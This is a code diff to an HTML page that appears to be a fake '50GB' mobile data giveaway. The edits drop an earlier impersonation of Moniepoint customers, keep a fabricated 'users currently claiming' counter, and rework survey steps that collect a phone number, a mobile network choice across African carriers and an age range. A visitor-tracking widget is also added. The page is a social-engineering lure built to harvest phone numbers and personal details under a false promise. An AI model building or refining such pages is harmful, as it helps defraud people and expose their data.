@@ -144,7 +144,7 @@
 <body>
 
 <div class="live-status">
-    <span class="dot"></span> <span id="online-count">1,375</span> Moniepoint Customers are currently claiming this reward
+    <span class="dot"></span> <span id="online-count">1,375</span> users are currently claiming this reward
 </div>
 
 <div class="header">
@@ -164,40 +164,48 @@
 
         <div id="step-name">
             <h3>Enter Phone Number</h3>
-            <input type="text" id="userName" class="opay-input" placeholder="Enter Your Phone Number">
+            <input type="text" id="userName" class="opay-input" placeholder="Enter your phone number">
             <button class="btn btn-dark" onclick="showStep('step-account')">CONTINUE</button>
         </div>
 
         <div id="step-account">
-          <h3>Gender</h3>
-            <div class="option-btn" onclick="showStep('step-applied')">Male</div>
-            <div class="option-btn" onclick="showStep('step-applied')">Female</div>
+            <h3>Select Your Network</h3>
+            <div class="option-btn" onclick="showStep('step-applied')">MTN</div>
+            <div class="option-btn" onclick="showStep('step-applied')">ORANGE</div>
+            <div class="option-btn" onclick="showStep('step-applied')">VODACOM</div>
+            <div class="option-btn" onclick="showStep('step-applied')">SAFARICOM</div>
+            <div class="option-btn" onclick="showStep('step-applied')">AIRTEL</div>
+            <div class="option-btn" onclick="showStep('step-applied')">GLO</div>
+            <div class="option-btn" onclick="showStep('step-applied')">ZAIN</div>
+            <div class="option-btn" onclick="showStep('step-applied')">UNITEL</div>
+            <div class="option-btn" onclick="showStep('step-applied')">MOVICEL</div>
+            <div class="option-btn" onclick="showStep('step-applied')">MAROC TELECOM</div>
+            <div class="option-btn" onclick="showStep('step-applied')">CELL C</div>
+            <div class="option-btn" onclick="showStep('step-applied')">TELKOM</div>
+            <div class="option-btn" onclick="showStep('step-applied')">OTHERS</div>
         </div>
 
         <div id="step-applied">
-            <h3>Have You Received This Offer Before?</h3>
-            <div class="option-btn" onclick="showStep('step-age')">Yes</div>
-            <div class="option-btn" onclick="showStep('step-age')">No</div>
+            <h3>Have You Received This 50GB Offer Before?</h3>
+            <div class="option-btn" onclick="showStep('step-gender')">YES</div>
+            <div class="option-btn" onclick="showStep('step-gender')">NO</div>
          
          
         </div>
 
+        <div id="step-gender">
+            <h3>Rate The Ongoing AFCON2025?</h3>
+            <div class="option-btn" onclick="showStep('step-age')">Great</div>
+            <div class="option-btn" onclick="showStep('step-age')">Good</div>
+          <div class="option-btn" onclick="showStep('step-age')">Excellent</div>
+          <div class="option-btn" onclick="showStep('step-age')">Poor</div>
+        </div>
 
         <div id="step-age">
-            <h3>Select Your Network</h3>
-            <div class="option-btn" onclick="showStep('step-load')">MTN</div>
-            <div class="option-btn" onclick="showStep('step-load')">ORANGE</div>
-            <div class="option-btn" onclick="showStep('step-load')">VODACOM</div>
-            <div class="option-btn" onclick="showStep('step-load')">SAFARICOM</div>
-            <div class="option-btn" onclick="showStep('step-load')">AIRTEL</div>
-            <div class="option-btn" onclick="showStep('step-load')">GLO</div>
-            <div class="option-btn" onclick="showStep('step-load')">ZAIN</div>
-            <div class="option-btn" onclick="showStep('step-load')">UNITEL</div>
-            <div class="option-btn" onclick="showStep('step-load')">MOVICEL</div>
-            <div class="option-btn" onclick="showStep('step-load')">MAROC TELECOM</div>
-            <div class="option-btn" onclick="showStep('step-load')">CELL C</div>
-            <div class="option-btn" onclick="showStep('step-load')">TELKOM</div>
-            <div class="option-btn" onclick="showStep('step-load')">OTHERS</div>
+            <h3>Select Your Age Range</h3>
+            <div class="option-btn" onclick="showStep('step-load')">18-25</div>
+            <div class="option-btn" onclick="showStep('step-load')">26-35</div>
+            <div class="option-btn" onclick="showStep('step-load')">36+</div>
         </div>
 
         <div id="step-load">
@@ -357,6 +365,8 @@
 </script>
 
 
+<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1726967,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
 
 
 </center></body></html>
